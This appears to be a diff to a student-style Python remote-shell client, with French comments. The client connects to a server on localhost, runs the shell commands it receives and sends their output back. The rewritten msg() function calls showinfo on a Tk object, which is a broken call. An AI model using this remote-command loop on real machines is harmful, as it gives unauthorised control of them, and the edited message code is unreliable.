@@ -3,10 +3,12 @@ import time
 import os
 import subprocess
 from tkinter import messagebox
+from tkinter import *
 
+# -------------- Constantes --------------
 HOST_IP = "127.0.0.1"
 HOST_PORT = 3500
-MAX_DATA_SIZE = 1024
+MAX_DATA_SIZE = 4000
 
 # --------------- Fonctions ---------------
 def send(data):
@@ -40,9 +42,11 @@ def shell_client():
 				send(resultat.stdout)
          		
 def msg(data):
-	tkinter.messagebox.showinfo(title="Message", message=data)
+	t = Tk()
+	t.showinfo('Message', data)
 	send("Executed")
 
+	
 # Connexion au serveur
 print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
 while True:
@@ -56,6 +60,7 @@ while True:
 		print("Connecté au serveur")
 		break
 
+# -------------- Main --------------
 while True:
 	data = listen()
 	command_split = data.split(" ")
@@ -71,8 +76,6 @@ while True:
 	if len(command_split) == 2 and command_split[0] == "msg":
 		msg(command_split[1])
 		
-
-  
 
 
 s.close()
